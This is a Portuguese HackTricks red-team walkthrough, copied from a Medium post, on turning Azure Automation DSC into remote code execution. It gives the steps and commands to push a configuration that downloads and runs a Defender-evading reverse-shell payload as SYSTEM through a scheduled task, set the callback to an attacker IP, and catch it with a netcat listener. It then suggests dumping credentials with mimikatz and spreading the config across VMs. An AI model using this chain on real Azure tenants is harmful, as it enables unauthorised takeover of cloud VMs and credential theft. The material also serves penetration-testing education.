# Az - State Configuration RCE

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Participe do grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou do grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Este post foi copiado de** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### Prepara√ß√£o da Infraestrutura do Servidor Remoto (C2) <a href="#f0fa" id="f0fa"></a>

Estarei hospedando uma vers√£o simplificada do payload Nishang Invoke-PowerShellTcp.ps1 do servidor remoto "40.84.7.74", que √© a caixa Kali. O nome do payload ser√° "RevPS.ps1". Para evitar que o script Nishang seja exclu√≠do pelo Windows Defender por qualquer motivo (talvez voc√™ prefira salvar o arquivo no disco), aqui tem uma vers√£o leve que voc√™ pode usar e que vai burlar o Defender: [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1). Isso ser√° hospedado por um simples Python Simple Server na caixa Kali.

### Passo 1 ‚Äî Criar Arquivos <a href="#89de" id="89de"></a>

Precisaremos criar outro arquivo de configura√ß√£o DSC. Um modelo pode ser baixado aqui: [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1). Este arquivo de configura√ß√£o usar√° a mesma fun√ß√£o de escrita de arquivo que usamos anteriormente. Desta vez, o conte√∫do inclui c√≥digo para baixar e executar um payload do nosso servidor remoto. Al√©m disso, estamos usando uma fun√ß√£o de tarefa agendada dispon√≠vel no m√≥dulo _ComputerManagementDsc_. A fun√ß√£o de tarefa agendada ter√° um papel chave na execu√ß√£o e nos fornecer√° privil√©gios de SYSTEM mais tarde.

Tamb√©m baixaremos um script que ser√° usado para publicar nossa configura√ß√£o na VM. Ele est√° localizado aqui: [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1).

Esses arquivos servir√£o como um modelo. **Voc√™ precisar√° preencher os nomes das vari√°veis e par√¢metros com o que voc√™ est√° usando**. Isso inclui os nomes dos recursos, caminhos de arquivos e os nomes do servidor/payload externo que voc√™ est√° usando. Por favor, consulte os coment√°rios no c√≥digo.

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

### Passo 2 ‚Äî Compactar Arquivo de Configura√ß√£o <a href="#c2c2" id="c2c2"></a>

Com nossos dois arquivos criados, vamos compactar o arquivo **‚Äòreverse\_shell\_config.ps1‚Äô** para que possa ser enviado para a Conta de Armazenamento
```
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
### Passo 3 ‚Äî Configurar Contexto de Armazenamento & Upload <a href="#bed9" id="bed9"></a>

Novamente, vamos configurar o contexto da nossa Conta de Armazenamento, o que eu j√° fiz. Eu j√° tenho um cont√™iner chamado '**azure-pentest**', ent√£o √© aqui que farei a publica√ß√£o:
```
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
### Passo 4 ‚Äî Preparar a Kali Box <a href="#20fb" id="20fb"></a>

Na nossa Kali box, podemos simplesmente usar _wget_ para baixar nosso payload do PowerShell. O script do reverse-shell em sua forma bruta est√° localizado aqui: [https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1](https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1).
```
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
```markdown
<figure><img src="../../../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

Precisamos editar o script de reverse-shell adicionando nossos par√¢metros, para que a VM do Windows saiba onde se conectar ap√≥s a execu√ß√£o. No meu caso, adicionei o seguinte:
```
```
RevPShell -Reverse 40.84.7.73 443
```
### Passo 5 ‚Äî Publicar Arquivo de Configura√ß√£o <a href="#9ad6" id="9ad6"></a>

Agora vamos executar nosso arquivo de configura√ß√£o. Eu configurei o meu para ser publicado na √Årea de Trabalho para uma melhor visualiza√ß√£o, no entanto, ele pode ser publicado em praticamente qualquer lugar. Ap√≥s alguns minutos, veremos que o script de reverse-shell foi publicado!

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Passo 6 ‚Äî Hospedar Payload e Configurar Listener <a href="#c55f" id="c55f"></a>

Uma vez que publicamos a configura√ß√£o, podemos iniciar simultaneamente um Python SimpleHTTPServer na porta 80 para hospedar o payload, juntamente com um listener netcat para capturar a conex√£o:
```
sudo python -m SimpleHTTPServer 80sudo nc -nlvp 443
```
Vemos que a tarefa agendada foi executada e nosso payload foi recuperado e executado na mem√≥ria com privil√©gios de n√≠vel **SYSTEM**!

<figure><img src="../../../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

### Conclus√£o <a href="#1ec2" id="1ec2"></a>

Isso agora abre a porta para muitas possibilidades. Como temos um shell rodando como **SYSTEM**, podemos despejar credenciais com mimikatz (potencialmente arriscado dependendo da maturidade do EDR para recursos na nuvem). Se voc√™ despejar credenciais, h√° uma boa chance de que elas possam ser reutilizadas em diferentes recursos. Por √∫ltimo, uma grande li√ß√£o √© que, em vez de limitar isso a uma VM, voc√™ agora tem a capacidade de potencialmente aplicar essa configura√ß√£o em v√°rias VMs.

Com isso, conclu√≠mos nossas aventuras com Azure Automation DSC! Espero que voc√™ tenha se divertido, aprendido muito e continue a expandir com sua pr√≥pria criatividade.

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
